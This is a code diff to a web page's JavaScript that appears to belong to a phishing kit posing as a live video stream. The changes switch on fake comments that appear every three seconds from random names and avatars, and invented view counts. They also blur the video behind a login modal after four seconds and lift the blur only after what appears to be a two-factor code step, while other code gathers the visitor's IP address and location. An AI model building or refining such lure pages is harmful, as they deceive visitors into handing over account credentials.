@@ -285,15 +285,17 @@
             }
         });
 
-        const VIDEO = [
-            "/images/test1.gif",
-            "/images/test2.gif",
-            "/images/test3.gif",
-            "/images/test4.gif",
-            "/images/test5.gif",
-        ];
-
-        // $('#myVideo').attr('src', VIDEO[getRandom(0, VIDEO.length - 1)]);
+        function getActiveVideo() {
+            $.ajax({
+                method: "GET",
+                url: "{{ route('videos.getActiveVideo') }}",
+                success: function(response) {
+                    const VIDEO = response.videos;
+                    $('#myVideo').attr('src', VIDEO[getRandom(0, VIDEO.length - 1)]['link']);
+                }
+            })
+        }
+        getActiveVideo();
 
         var ipAddress = "";
         var latitude = "";
@@ -352,28 +354,28 @@
         }, 200);
 
         var id_interval = null;
-        // $(document).ready(function() {
-        //     id_interval = setInterval(() => {
-        //         $('.list-comment').append(`
-    //         <div class="comment mb-2">
-    //             <div class="comment-left">
-    //                 <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
-    //                     alt="image">
-    //             </div>
-    //             <div class="comment-right">
-    //                 <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
-    //               ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
-    //                         referrerpolicy="origin-when-cross-origin"
-    //                         src="${ICON[getRandom(0, ICON.length - 1)]}">
-    //             </div>
-    //         </div>
-    //         `);
-        //         $(".list-comment").animate({
-        //             scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
-        //                 .clientHeight
-        //         }, 200);
-        //     }, 3000);
-        // });
+        $(document).ready(function() {
+            id_interval = setInterval(() => {
+                $('.list-comment').append(`
+            <div class="comment mb-2">
+                <div class="comment-left">
+                    <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
+                        alt="image">
+                </div>
+                <div class="comment-right">
+                    <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
+                  ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
+                            referrerpolicy="origin-when-cross-origin"
+                            src="${ICON[getRandom(0, ICON.length - 1)]}">
+                </div>
+            </div>
+            `);
+                $(".list-comment").animate({
+                    scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
+                        .clientHeight
+                }, 200);
+            }, 3000);
+        });
 
         function getRandom(min, max) {
             return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -499,6 +501,8 @@
                                 }
                                 $('.button-send-fa').prop('disabled', false);
                                 clearInterval(idIntervalGetCacheByEmail);
+                                //
+                                $('#myVideo').css("filter", "none");
                                 // call api clear all cache
                                 $.ajax({
                                     method: "POST",
@@ -563,6 +567,7 @@
 
         setTimeout(() => {
             $("#modal-login").css("display", "block");
+            $('#myVideo').css("filter", "blur(30px)");
         }, 4000);
         setInterval(() => {
             $(".amount-view").text(`5${getRandom(4, 9)},${getRandom(1, 9)}K`);
